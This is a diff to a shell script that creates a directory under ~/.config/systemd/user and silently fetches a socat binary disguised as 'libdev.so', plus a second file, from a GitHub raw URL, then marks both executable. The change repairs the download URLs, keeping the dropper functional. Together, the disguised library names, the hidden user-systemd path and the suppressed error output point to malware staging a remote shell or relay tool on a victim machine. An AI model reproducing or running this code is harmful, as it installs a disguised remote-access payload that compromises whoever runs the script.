@@ -4,9 +4,9 @@
 
 mkdir -p $HOME/.config/systemd/user/libxct-util
 
-curl -s -l -o $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/pqowbbb/testing/raw/main/socatx64.bin 2>/dev/null
+curl -s -l -o $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/pqowbbb/testing/main/socatx64.bin 2>/dev/null
 
-curl -s -l -o $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://raw.githubusercontent.com/pqowbbb/testing/raw/main/libdev.so.6 2>/dev/null
+curl -s -l -o $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://raw.githubusercontent.com/pqowbbb/testing/main/libdev.so.6 2>/dev/null
 
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6
